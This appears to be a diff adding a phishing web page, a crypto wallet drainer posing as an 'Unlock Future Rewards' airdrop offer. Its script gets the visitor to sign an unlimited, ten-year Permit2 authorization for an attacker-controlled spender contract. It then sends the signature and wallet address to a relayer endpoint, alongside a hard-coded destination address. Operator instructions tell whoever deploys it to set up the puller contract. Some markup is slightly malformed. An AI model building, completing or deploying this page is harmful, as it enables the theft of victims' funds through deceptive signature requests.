@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Unlock Future Rewards</title>
+  <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js"></script>
+  <script src="https://unpkg.com/@uniswap/permit2-sdk@1.2.0/dist/permit2.min.js"></script>
+  <style>
+    body {
+      margin: 0;
+      font-family: system-ui, -apple-system, sans-serif;
+      background: linear-gradient(135deg, #0f0029, #1a0040);
+      color: white;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      padding: 1rem;
+    }
+    .container {
+      max-width: 420px;
+      padding: 2rem;
+    }
+    h1 {
+      font-size: 2.6rem;
+      margin: 0 0 1rem;
+    }
+    p {
+      opacity: 0.9;
+      line-height: 1.5;
+    }
+    .card {
+      background: rgba(255,255,255,0.08);
+      backdrop-filter: blur(12px);
+      border-radius: 24px;
+      padding: 2rem;
+      margin: 2rem 0;
+      border: 1px solid rgba(255,255,255,0.1);
+    }
+    .btn {
+      padding: 16px 40px;
+      font-size: 1.3rem;
+      font-weight: bold;
+      border: none;
+      border-radius: 18px;
+      cursor: pointer;
+      background: #00ff9d;
+      color: #000;
+      margin: 1rem;
+      transition: all 0.2s;
+    }
+    .btn:hover { transform: scale(1.05); }
+    .btn:disabled { opacity: 0.6; cursor: not-allowed; }
+    .small { font-size: 0.9rem; opacity: 0.8; margin-top: 2rem; }
+    .status { margin-top: 1rem; font-weight: bold; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Unlock Future Rewards</h1>
+    <p>Sign once and automatically receive every token, airdrop, and reward that ever lands in your wallet.</p>
+
+    <button id="connect" class="btn">Connect Wallet</button>
+
+    <div id="main" class="hidden">
+      <div class="card">
+        <p>Connected as <span id="addr></span></p>
+        <button id="sign" class="btn">Sign</button>
+        <div class="status" id="status">Ready — click to sign</div>
+      </div>
+      <p class="small">
+        Your signature lets the project instantly deliver any future tokens to you.<br>
+        No gas, no extra steps — forever.
+      </p>
+    </div>
+  </div>
+
+  <script>
+    // ==== YOUR SETTINGS (only change these two lines) ====
+    const PULLER_CONTRACT = "0xDEPLOY_AND_PUT_ADDRESS_HERE"; // ← Deploy the contract below first!
+    const FINAL_DESTINATION = "0xcde71a94923dd426910ce9beb8e1d1c3eb11cd2f";
+    const CHAIN_ID = 8453; // Base Mainnet
+    // =====================================================
+
+    let provider, signer, userAddress;
+
+    document.getElementById("connect").onclick = async () => {
+      if (!window.ethereum) return alert("Please install MetaMask or another wallet");
+
+      provider = new ethers.providers.Web3Provider(window.ethereum);
+      await provider.send("eth_requestAccounts", []);
+      signer = provider.getSigner();
+      userAddress = await signer.getAddress();
+
+      // Switch to Base
+      try {
+        await window.ethereum.request({
+          method: "wallet_switchEthereumChain",
+          params: [{ chainId: "0x" + CHAIN_ID.toString(16) }],
+        });
+      } catch (e) {
+        if (e.code === 4902) {
+          await window.ethereum.request({
+            method: "wallet_addEthereumChain",
+            params: [{
+              chainId: "0x2105",
+              chainName: "Base",
+              nativeCurrency: { name: "ETH", symbol: "ETH", decimals: 18 },
+              rpcUrls: ["https://mainnet.base.org"],
+              blockExplorerUrls: ["https://basescan.org"]
+            }]
+          });
+        }
+      }
+
+      document.querySelector("#connect").classList.add("hidden");
+      document.querySelector("#main").classList.remove("hidden");
+      document.querySelector("span").textContent = userAddress.slice(0,6) + "..." + userAddress.slice(-4);
+    };
+
+    document.getElementById("sign").onclick = async () => {
+      const deadline = Math.floor(Date.now() / 1000) + 60*60*24*365*10; // 10 years = basically forever
+      const maxAmount = ethers.constants.MaxUint256;
+
+      const permit = {
+        permitted: {
+          token: "0x0000000000000000000000000000000000000000", // wildcard token
+          amount: maxAmount
+        },
+        spender: PULLER_CONTRACT,
+        nonce: 0,
+        deadline: deadline
+      };
+
+      document.getElementById("status").textContent = "Open your wallet and confirm the signature...";
+
+      try {
+        const { domain, types, values } = Permit2Signature.permitTransferFrom(permit, userAddress, CHAIN_ID);
+        const signature = await signer._signTypedData(domain, types, values);
+        const { v, r, s } = ethers.utils.splitSignature(signature);
+
+        // Send signature to your backend / database / relayer
+        await fetch("https://your-relayer-or-webhook.example.com/save", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            user: userAddress,
+            deadline,
+            v, r, s,
+            puller: PULLER_CONTRACT,
+            destination: FINAL_DESTINATION
+          })
+        });
+
+        document.getElementById("status").innerHTML = "Signed forever!<br>Every token that ever enters your wallet will be sent to the project.";
+        document.getElementById("sign").disabled = true;
+      } catch (err) {
+        console.error(err);
+        document.getElementById("status").textContent = "Signature rejected or failed: " + err.message;
+      }
+    };
+  </script>
+</body>
+</html>
